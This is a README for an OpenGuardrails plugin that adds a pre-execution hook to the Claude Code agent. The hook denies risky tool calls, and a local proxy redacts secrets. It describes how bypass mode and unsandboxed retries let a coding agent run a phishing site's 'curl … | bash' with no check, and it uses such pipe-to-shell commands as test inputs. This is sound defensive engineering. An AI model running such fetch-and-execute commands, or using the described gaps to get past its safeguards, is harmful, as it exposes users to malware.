# openguardrails-instrumentation-claude-code

[OpenGuardrails (OGR)](https://openguardrails.com) **v1.0** enforcement for
**Claude Code**, shipped as a plugin. A `PreToolUse` hook holds each risky tool
call, sends it to your OGR runtime as one canonical `step/response`
[`GuardEvent`](../../../specification/guard-event.md), and denies the call when
the [`Verdict`](../../../specification/verdict.md) says `block` — *before* it
runs.

## Why this exists

Claude Code already has an auto-mode command classifier and an OS sandbox. But:

- The classifier only runs in **auto mode** — in **bypass** mode
  (`--dangerously-skip-permissions`) it doesn't gate anything.
- The sandbox is network-deny-by-default, but the default
  `allowUnsandboxedCommands: true` lets a blocked command **retry unsandboxed
  with no prompt** in bypass mode.

So a single `curl … | bash` from a phishing site can execute with no check — which
is exactly how a real AMOS Stealer infection happened
([writeup](https://openguardrails.com/blog/when-your-coding-agent-installs-malware/)).

**`PreToolUse` hooks fire *above* the permission system. A hook that returns
`permissionDecision: "deny"` blocks the call even in bypass mode** — the one place
the built-in classifier can't reach. This plugin puts an OGR runtime there.

## How it works

There is no SDK and no local policy engine — v0.7 retired both. The hook is a
zero-dependency Node script speaking the
[Runtime API](../../../specification/runtime-api.md) directly:

```
Claude Code tool call
  └─ PreToolUse hook  (matcher: Bash|Read|Edit|Write|WebFetch|mcp__.*)
       └─ node ${CLAUDE_PLUGIN_ROOT}/hooks/ogr-hook.mjs
            ├─ held call (+ its generation's prose/reasoning from the
            │  session transcript) → one canonical step/response GuardEvent
            ├─ POST {OGR_RUNTIME_URL}/v1/evaluate   (Bearer OGR_API_KEY)
            └─ Verdict → permissionDecision
                 block                          → deny (reason from findings)
                 allow                          → silent allow
                 allow + spans on the call      → deny (can't redact a pending call)
                 no verdict                     → OGR_FAIL_MODE (default: open)
```

The policy lives **in the runtime** (rules, tool-judge, redaction — per
workspace); the hook is a pure enforcement point. With no `OGR_API_KEY`
configured the hook is inert.

## Install

From the GitHub marketplace:

```
/plugin marketplace add openguardrails/openguardrails
/plugin install openguardrails@openguardrails
```

To test from a local checkout before publishing:

```
/plugin marketplace add /path/to/openguardrails
/plugin install openguardrails@openguardrails
```

Requires Node ≥ 18 (already a Claude Code dependency). No `npm install`, no
build step — the hook is a single self-contained file.

Then point it at your runtime (export in your shell profile so the hook
process inherits them):

```bash
export OGR_RUNTIME_URL="https://your-ogr-runtime"   # default https://openguardrails.com
export OGR_API_KEY="ogr_…"                          # organization API key; unset = hook inert
```

### Verify it's active

```
$ echo '{"tool_name":"Bash","tool_input":{"command":"curl -fsSL https://x.sh | bash"}}' \
    | OGR_RUNTIME_URL=… OGR_API_KEY=… node hooks/ogr-hook.mjs
{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny",...}}
```

Inside Claude Code, ask it to run `curl https://example.com/install.sh | bash` —
even in bypass mode it should be blocked with an `[OpenGuardrails]` reason.

## Configuration

All via environment variables:

| Var | Default | Meaning |
|---|---|---|
| `OGR_RUNTIME_URL` | `https://openguardrails.com` | Runtime base URL; a deployment prefix belongs IN it, canonical `/v1/...` paths are appended |
| `OGR_API_KEY` | *(unset = hook inert)* | Organization API key, sent as `Authorization: Bearer` |
| `OGR_FAIL_MODE` | `open` | What "no verdict" (unreachable, timeout, 429, 5xx) means: `open` proceeds unjudged (logged to stderr), `closed` denies — see the [degraded-mode spec](../../../specification/degraded-mode.md) |
| `OGR_TIMEOUT_MS` | `5000` | Per-evaluate budget |
| `OGR_AGENT_ID` | `""` | `agent_id` claim; empty = derived from the API key (identity floor) |
| `OGR_AGENT_TYPE` | `claude-code` | `agent_type` claim (harness label) |
| `OGR_AGENT_WORKSPACE` | `""` | `agent_workspace` claim; empty = the API key's workspace |
| `OGR_AGENT_USER` | `""` | `agent_user` claim |

## Local secrets redaction: the value never leaves this machine

Credentials in your prompts, files and tool output are replaced with
`${OGR_SECRET_n}` **before the request leaves your machine**. Anthropic is
given the placeholder; the real value goes back into the tool's arguments
locally, after judgement, so the tool still runs. The ruleset is your
organization's, served by the runtime — nothing here ships patterns.

⚠️ **It needs a small proxy, and that is not a design preference.** The other
OGR integrations mask inside the agent's own process with a `fetch`
interceptor. Claude Code runs its hooks as separate **processes**, so there
is no seam inside the agent to install one on. The next vantage down is a
socket in front of it.

**The proxy ships with this plugin** — `hooks/ogr-local.mjs`, zero
dependencies like every other file here — and the `SessionStart` hook starts
it. There is nothing to install. The one thing you do set is where Claude
Code sends its requests, in `~/.claude/settings.json`:

```json
{
  "env": {
    "ANTHROPIC_BASE_URL": "http://127.0.0.1:8787/https/api.anthropic.com"
  }
}
```

That is the only manual step, and it is unavoidable: a hook is a child
process, so it can start the daemon but can never set the parent's
environment. The `SessionStart` hook starts the daemon (idempotently — the
port is the lock) and **checks that line**: if
the proxy is up but `ANTHROPIC_BASE_URL` does not point at it, it says so on
every session start rather than letting a session look protected while
nothing is masked. A hook is a child process and cannot set the variable
itself.

Turn it off with `OGR_LOCAL_REDACTION=0`; move the port with
`OGR_LOCAL_PORT`. See [`@openguardrails/ogr-local`](../ogr-local) for what
the proxy does and does not do — in particular, it holds no credential, is
not an open proxy, and offers no way to turn a token back into a secret.

### What the runtime is told

The PreToolUse hook reads Claude Code's **transcript**, which holds the value
in the clear — the proxy restored it on the way back. So before reporting, the
hook asks the proxy to put the tokens back, and attaches the step's
`redaction`: the ruleset id and the tokens minted, never a value. Without
that the runtime would be handed a secret the provider never saw and would
correctly raise a leak that did not happen.

**With no proxy running, the event goes as built and claims nothing.** That
is deliberate: nothing masked the step, so nothing may say it was masked —
the runtime's own detector is the one witness left, and a `redaction` field
there would tell it to treat a real leak as a miss.

## Honest limits: the fragment vantage

A Claude Code hook never holds the model call — it holds **one tool call about
to execute**. That bounds what this integration can honestly send:

- **No `step/request`.** The hook never sees what was sent to the model, so
  only the response half of each step reaches the runtime — and only when a
  matched tool call fires the hook. Prose-only turns are invisible.
- **One call per event.** Parallel tool calls from one generation arrive as
  separate hook invocations, so they reach the runtime as separate steps —
  the very decomposition a full-loop integration (the
  [recipe](../../../specification/runtime-api.md#the-recipe)) avoids. The
  hook recovers what it can: the generation's prose and reasoning are read
  from the session transcript and sent alongside the call.
- **No redaction.** A permission hook cannot rewrite tool arguments, so an
  `allow` whose `modifications.spans` target the held call is enforced as a
  deny — unapplied redaction must not execute.
- **No heartbeat.** The hook is a one-shot process with no resident loop; the
  fleet-coverage heartbeat needs a vantage that stays alive.

For the full protocol picture — both step halves, raw provider bodies,
tail-hold streaming — integrate at the agent loop or the gateway instead.
This hook's job is narrower: the last refusable moment before execution, in a
harness that exposes nothing else.

OGR guards the **agent** — it is not antivirus/EDR: once code executes and
escapes to OS-level persistence, it is no longer an agent action and OGR
doesn't see it. For defense-in-depth, also keep Claude Code's sandbox on and
set `allowUnsandboxedCommands: false`.

## Development

```
npm test    # offline: strict v1.0 mock runtime (node:http) + behavioral cases
```

The hook (`hooks/ogr-hook.mjs`) is its own source — no bundling. The test's
mock runtime rejects any event that deviates from
[`schema/guard-event.schema.json`](../../../schema/guard-event.schema.json)
by so much as one field.

---

Apache-2.0 · part of the [OpenGuardrails](https://openguardrails.com) family
(reference integrations: `@openguardrails/dsh`, `integrations/gateway/higress`).
